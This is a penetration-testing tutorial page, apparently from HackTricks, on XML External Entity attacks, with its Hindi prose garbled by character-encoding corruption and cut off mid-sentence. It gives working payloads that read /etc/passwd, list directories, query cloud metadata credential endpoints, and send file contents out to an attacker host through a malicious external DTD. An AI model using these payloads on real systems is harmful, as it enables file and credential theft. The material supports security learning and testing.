# XXE - XEE - XML External Entity

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** рдЯреНрд╡рд┐рдЯрд░ рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**ред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

рдПрдХ XML External Entity рд╣рдорд▓рд╛ рдПрдХ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╣рдорд▓рд╛ рд╣реИ рдЬреЛ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЦрд┐рд▓рд╛рдл рд╣реЛрддрд╛ рд╣реИ рдЬреЛ XML рдЗрдирдкреБрдЯ рдХреЛ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред

## XML Basics

**рдЗрд╕рдХрд╛ рдЕрдзрд┐рдХрд╛рдВрд╢ рдЗрд╕ рдЕрджреНрднреБрдд Portswigger рдкреЗрдЬ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### Extensible Markup Language рдХрд╛ рдЕрд╡рд▓реЛрдХрди <a href="#overview-of-extensible-markup-language" id="overview-of-extensible-markup-language"></a>

рдПрдХреНрд╕рдЯреЗрдВрд╕рд┐рдмрд▓ рдорд╛рд░реНрдХрдЕрдк рднрд╛рд╖рд╛, рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ XML рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдбреЗрдЯрд╛ рдХреЗ рднрдВрдбрд╛рд░рдг рдФрд░ рдкрд░рд┐рд╡рд╣рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдкреЗрдбрд╝ рдХреА рддрд░рд╣ рдХрд╛ рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдЬрд┐рд╕рдореЗрдВ рдЯреИрдЧ рдФрд░ рдбреЗрдЯрд╛ HTML рдХреЗ рд╕рдорд╛рди рд╣реЛрддреЗ рд╣реИрдВ, XML рдиреЗ рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЯреИрдЧреЛрдВ рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдирд╣реАрдВ рд╣реЛрдиреЗ рдХреА рд╡рдЬрд╣ рд╕реЗ рдЦреБрдж рдХреЛ рдЕрд▓рдЧ рдХрд┐рдпрд╛ред рдпрд╣ рд▓рдЪреАрд▓рд╛рддрд╛ рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд╡реЗ рдбреЗрдЯрд╛ рдХреЗ рдЕрдиреБрд░реВрдк рд╡рд░реНрдгрди рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╡рд░реНрдгрд┐рдд рдХрд░рддреЗ рд╣реИрдВред рдРрддрд┐рд╣рд╛рд╕рд┐рдХ рд░реВрдк рд╕реЗ, XML рдиреЗ рдбреЗрдЯрд╛ рдкрд░рд┐рд╡рд╣рди рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рд╛рд░реВрдк рдХреЗ рд░реВрдк рдореЗрдВ рдорд╣рддреНрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛, рдЬрд┐рд╕реЗ "AJAX" рд╢рдмреНрджрд╛рдХреНрд╖рд░ рдХреЗ рдпреЛрдЧрджрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдЬрд╣рд╛рдВ "X" "XML" рдХреЗ рд▓рд┐рдП рд╣реИ)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рдХреА рд▓реЛрдХрдкреНрд░рд┐рдпрддрд╛ рдХрдо рд╣реЛ рдЧрдИ рд╣реИ, JSON рдХреЛ рдкрд╕рдВрджреАрджрд╛ рдкреНрд░рд╛рд░реВрдк рдХреЗ рд░реВрдк рдореЗрдВ рдЙрднрд░рддреЗ рд╣реБрдП рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИред

### XML рдореЗрдВ рдбреЗрдЯрд╛ рдЖрдЗрдЯрдореЛрдВ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╕реНрддреБрддреАрдХрд░рдг <a href="#representation-of-data-items-in-xml-through-entities" id="representation-of-data-items-in-xml-through-entities"></a>

XML рдореЗрдВ рдПрдВрдЯрд┐рдЯреА рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдбреЗрдЯрд╛ рдЖрдЗрдЯрдореЛрдВ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддрдВрддреНрд░ рд╣реЛрддреА рд╣реИрдВ, рд╕реАрдзреЗ рдбреЗрдЯрд╛ рд╕рдореНрдорд┐рд▓рди рдХреЗ рд╡рд┐рдХрд▓реНрдк рдХреЗ рд░реВрдк рдореЗрдВред XML рд╡рд┐рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдПрдВрдЯрд┐рдЯреА рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `&lt;` рдФрд░ `&gt;` `<` рдФрд░ `>` рд╡рд░реНрдгреЛрдВ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред рдЗрди рдореЗрдЯрд╛рдХреИрд░реЗрдХреНрдЯрд░реНрд╕ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдирдХреА рднреВрдорд┐рдХрд╛ рдХреЛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрдиреНрд╣реЗрдВ рдЕрдХреНрд╖рд░реЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрдм рд╡реЗ рдбреЗрдЯрд╛ рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреЗ рд╣реИрдВред

### XML рддрддреНрд╡реЛрдВ рдХреА рдкрд░рд┐рднрд╛рд╖рд╛

рдПрдХреНрд╕рдПрдордПрд▓ рдореЗрдВ рддрддреНрд╡ рдкреНрд░рдХрд╛рд░ рдХреА рдШреЛрд╖рдгрд╛рдПрдБ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпреЗ рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рддрддреНрд╡реЛрдВ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐, рдкреНрд░рдХрд╛рд░ рдФрд░ рдХреНрд░рдордмрджреНрдзрддрд╛ рдХреЗ рджрд┐рд╢рд╛рдирд┐рд░реНрджреЗрд╢ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рд╕рд╣рд┐рддреА рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ:

- `<!ELEMENT stockCheck ANY>` рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ `<stockCheck></stockCheck>` рддрддреНрд╡ рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ рд╡рд╕реНрддреБ рдХреЛ рдШреЗрд░ рд╕рдХрддрд╛ рд╣реИред
- `<!ELEMENT stockCheck EMPTY>` рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ `<stockCheck></stockCheck>` рддрддреНрд╡ рдХреЛ рд╕рд╛рдордЧреНрд░реА рд╕реЗ рд░рд╣рдирд╛ рдЪрд╛рд╣рд┐рдПред
- `<!ELEMENT stockCheck (productId,storeId)>` рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ `<stockCheck>` рддрддреНрд╡ рдХреЗрд╡рд▓ `<productId>` рдФрд░ `<storeId>` рдХреЛ рдмрдЪреНрдЪрд╛ рддрддреНрд╡ рдХреЗ рд░реВрдк рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рдг рдХрд╛ рдкрд░рд┐рдЪрдп <a href="#introduction-to-document-type-definition" id="introduction-to-document-type-definition"></a>

рдПрдХреНрд╕рдПрдордПрд▓ рдореЗрдВ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рднрд╛рд╖рдг (рдбреАрдЯреАрдбреА) рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рд╕рдВрд░рдЪрдирд╛, рд╕реНрд╡реАрдХреГрдд рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ рдФрд░ рдЕрдзрд┐рдХ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдШреЛрд╖рдгрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред `DOCTYPE` рддрддреНрд╡, рдЬреЛ рдПрдХ рдПрдХреНрд╕рдПрдордПрд▓ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рд╢реБрд░реВ рдореЗрдВ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╣реИ рдФрд░ рдПрдХ рдбреАрдЯреАрдбреА рдХреА рдШреЛрд╖рдгрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдПрдХ рдбреАрдЯреАрдбреА рдХреА рдШреЛрд╖рдгрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдбреАрдЯреАрдбреА рдХреЛ "рдЖрдВрддрд░рд┐рдХ" рд╡рд░реНрдгрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдПрдХ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рд╕рдорд╛рд╣рд┐рдд рд╣реЛрддрд╛ рд╣реИ, "рдмрд╛рд╣реНрдп" рдЬрдм рдПрдХ рдмрд╛рд╣реНрдп рд╕реНрд░реЛрдд рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╛ рдПрдХ рд╕рдВрдпреЛрдЬрди рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рдПрдХреНрд╕рдПрдордПрд▓ рдореЗрдВ рдХрд╕реНрдЯрдо рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ <a href="#utilization-of-custom-entities-in-xml" id="utilization-of-custom-entities-in-xml"></a>

рдПрдХреНрд╕рдПрдордПрд▓ рдПрдХ рдбреАрдЯреАрдбреА рдХреЗ рднреАрддрд░ рдХрд╕реНрдЯрдо рдПрдВрдЯрд┐рдЯреА рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдПрдХ рдЙрджрд╛рд╣рд░рдг рдШреЛрд╖рдгрд╛:

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

рдРрд╕реА рдШреЛрд╖рдгрд╛ рдЗрд╕ рдмрд╛рдд рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИ рдХрд┐ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдПрдВрдЯрд┐рдЯреА рд╕рдВрджрд░реНрдн `&myentity;` рдХреЛ "my entity value" рд╕реЗ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░реЗрдЧрд╛ред

### рдПрдХреНрд╕рдПрдордПрд▓ рдореЗрдВ рдмрд╛рд╣реНрдп рдПрдВрдЯрд┐рдЯреА рдХрд╛ рд╕рдорд╛рд╡реЗрд╢ <a href="#incorporation-of-external-entities-in-xml" id="incorporation-of-external-entities-in-xml"></a>

рдПрдХреНрд╕рдПрдордПрд▓ рдореЗрдВ рдмрд╛рд╣реНрдп рдПрдВрдЯрд┐рдЯрд┐рдпреЛрдВ рдХреЛ рдХрд╕реНрдЯрдо рдПрдВрдЯрд┐рдЯрд┐рдпреЛрдВ рдХрд╛ рдПрдХ рдЙрдкрдкреНрд░рдХрд╛рд░ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рдирдХреА рдкрд░рд┐рднрд╛рд╖рд╛рдПрдБ рдбреАрдЯреАрдбреА рдХреЗ рдмрд╛рд╣рд░ рд╣реЛрддреА рд╣реИрдВред рдпреЗ рдПрдВрдЯрд┐рдЯрд┐рдпреЛрдВ `SYSTEM` рдХреАрд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдПрдХ URL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдПрдВрдЯрд┐рдЯреА рдХреЗ рдорд╛рди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рди рдХреА рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ [рдПрдХреНрд╕рдПрдордПрд▓ рдмрд╛рд╣реНрдп рдПрдВрдЯрд┐рдЯреА рд╣рдорд▓реЗ](https://portswigger.net/web-security/xxe) рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

### XXE рдбрд┐рдЯреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕рдПрдордПрд▓ рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯрд┐рдпреЛрдВ рдХрд╛ рд╢реЛрдзрди

рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдорд╛рдирдХ рдПрдВрдЯрд┐рдЯрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ XXE рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рднрд╛рд╡реА рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдорд╛рдиреНрдпрддрд╛ рдпрд╛ рдПрдХреНрд╕рдПрдордПрд▓ рдкрд╛рд░реНрд╕рд░ рдХреА рдордЬрдмреВрддреА, рдПрдХреНрд╕рдПрдордПрд▓ рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рдкреНрд░рддрд┐рд╢реНрд░реБрдд рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рднрд┐рдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдХреНрд╕рдПрдордПрд▓ рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯрд┐рдпреЛрдВ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрдВрдзреЗ XXE рдбрд┐рдЯреЗрдХреНрд╢рди рдХреЛ рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рдбреАрдПрдирдПрд╕ рд▓реБрдХрдЕрдк рдФрд░ рдПрдЪрдЯреАрдЯреАрдкреА рдЕрдиреБрд░реЛрдз рдХреЛ рдЖрд░рдВрдн рдХрд░рдХреЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рдбреЛрдореЗрди рдХреЛ рдкреБрд╖реНрдЯрд┐ рдХрд░рдХреЗ, рдЗрд╕ рддрд░рд╣ рд╕реЗ рд╣рдорд▓реЗ рдХреА рд╕рдлрд▓рддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддреЗ рд╣реБрдПред


## рдореБрдЦ
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### рдлрд╝рд╛рдЗрд▓ рдкрдврд╝реЗрдВ

рд╣рдо рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рд╕реЗ `/etc/passwd` рдкрдврд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВрдЧреЗред Windows рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `C:\windows\system32\drivers\etc\hosts`

рдЗрд╕ рдкрд╣рд▓реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ SYSTEM "_\*\*file:///\*\*etc/passwd_" рднреА рдХрд╛рдо рдХрд░реЗрдЧрд╛ред
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

рдпрд╣ рджреВрд╕рд░рд╛ рдорд╛рдорд▓рд╛ рдЙрдкрдпреЛрдЧреА рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЕрдЧрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ (рдкреЛрд░реНрдЯрд╕реНрд╡рд┐рдЧрд░реНрд╕ рд▓реИрдмреНрд╕ рдХрд╛ рдорд╛рдорд▓рд╛ рдирд╣реАрдВ рд╣реИ)
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
рдЗрд╕ рддреАрд╕рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рдо `Element stockCheck` рдХреЛ ANY рдХреЗ рд░реВрдк рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВред
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реВрдЪреА

**рдЬрд╛рд╡рд╛** рдЖрдзрд╛рд░рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдПрдХ рдРрд╕реА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдк рдПрдХ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ XXE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ (рдлрд╝рд╛рдЗрд▓ рдХреА рдмрдЬрд╛рдп рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдкреВрдЫ рд░рд╣рд╛ рд╣реИ):
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

рдПрдХ XXE рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рджрд▓ рдореЗрдВ рдПрдХ SSRF рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### рдмреНрд▓рд╛рдЗрдВрдб рдПрд╕рдПрд╕рдЖрд░рдПрдл

**рдкрд┐рдЫрд▓реЗ рдЯрд┐рдкреНрдкрдгреАрдд рддрдХрдиреАрдХ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдЕрдкрдиреА рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рджрд┐рдЦрд╛ рд╕рдХреЗред рд▓реЗрдХрд┐рди, рдЕрдЧрд░ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ, рд╢рд╛рдпрдж **рдПрдХреНрд╕рдПрдордПрд▓ рдПрдВрдЯрд┐рдЯреАрдЬ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ**, рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк **рдПрдХреНрд╕рдПрдордПрд▓ рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреАрдЬ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "рдЕрдВрдзрд╛" SSRF - рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рд╣рд░реА рдмреИрдВрдб рд╕реЗ рдирд┐рдХрд╛рд▓реЗрдВ

**рдЗрд╕ рдЕрд╡рд╕рд░ рдкрд░ рд╣рдо рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рдирдпрд╛ DTD рд▓реЛрдб рдХрд░рд╡рд╛рдПрдВрдЧреЗ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдкреЗрд▓реЛрдб рд╣реЛрдЧрд╛ рдЬреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ HTTP рдЕрдиреБрд░реЛрдз рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗрдЧрд╛ (рдмрд╣реБ-рд▓рд╛рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реЗ** _**ftp://**_**рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рд╣рд░реА рд░реВрдк рд╕реЗ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред рдпрд╣ рд╡реНрдпрд╛рдЦреНрдпрд╛** [**Portswiggers рд▓реИрдм рд╕реЗ рд▓реА рдЧрдИ рд╣реИ рдпрд╣рд╛рдБ**](https://portswigger.net/web-security/xxe/blind)**ред**

`/etc/hostname` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрд╛рд╣рд░реА рдмреИрдВрдб рд╕реЗ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ DTD рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
рдпрд╣ DTD рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рддрд╛ рд╣реИ:

